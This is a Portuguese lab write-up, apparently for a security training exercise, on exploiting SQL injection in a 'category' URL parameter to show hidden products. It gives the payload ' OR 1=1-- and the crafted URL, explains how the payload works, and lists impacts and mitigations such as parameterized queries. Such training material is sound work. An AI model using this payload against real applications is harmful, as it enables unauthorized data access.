# SQL Injection - Retrieve Hidden Data

## Objetivo

Explorar uma vulnerabilidade de SQL Injection para acessar dados ocultos da aplicação manipulando parâmetros da URL.

---

## Análise Inicial

Ao testar o parâmetro `category`, foi possível perceber que o valor enviado pelo usuário era inserido diretamente na query SQL.

Exemplo:

```txt
/filter?category=a
```

Isso indicava que a aplicação provavelmente montava a query de forma dinâmica:

```sql
SELECT * FROM products WHERE category = 'a'
```

Como o valor ficava entre aspas simples, tornou-se possível tentar manipular a lógica da consulta usando SQL Injection.

---

## Screenshot

> Adicionar print mostrando o parâmetro `category=a`

```md
![Category Parameter](../../screenshots/sql-injection/category-test.png)
```

---

## Exploração

Payload utilizado:

```sql
' OR 1=1--
```

URL explorada:

```txt
/filter?category=' OR 1=1--
```

---

## Como o Payload Funciona

O payload funciona em 3 partes:

### 1. Fecha a string original

O primeiro `'` fecha a string da query SQL.

Exemplo:

```sql
WHERE category = ''
```

---

### 2. Adiciona uma condição verdadeira

A parte:

```sql
OR 1=1
```

sempre retorna verdadeiro.

Isso faz o banco retornar todos os registros da tabela.

---

### 3. Comenta o restante da query

O:

```sql
--
```

faz o SQL ignorar o restante da instrução, evitando erros de sintaxe.

Query final:

```sql
SELECT * FROM products 
WHERE category = '' OR 1=1--'
```

---

## Resultado

Foi possível ignorar o filtro original da aplicação e visualizar produtos ocultos armazenados no banco de dados.

---

## Screenshot

<img width="1408" height="705" alt="image" src="https://github.com/user-attachments/assets/20326e90-b744-4e1a-87ce-2a97e646286c" />

---

## Impacto

Uma vulnerabilidade SQL Injection pode permitir:

* Vazamento de dados sensíveis
* Bypass de autenticação
* Enumeração do banco de dados
* Acesso não autorizado
* Comprometimento completo da aplicação

---

## Mitigação

* Prepared Statements
* Parameterized Queries
* Validação de entrada
* ORM seguro
* Menor privilégio no banco de dados

---

## Aprendizados

Esse laboratório mostrou na prática como concatenar entrada do usuário diretamente em queries SQL pode comprometer completamente uma aplicação.

Também ajudou a entender melhor a lógica por trás do payload, em vez de apenas copiar comandos prontos.
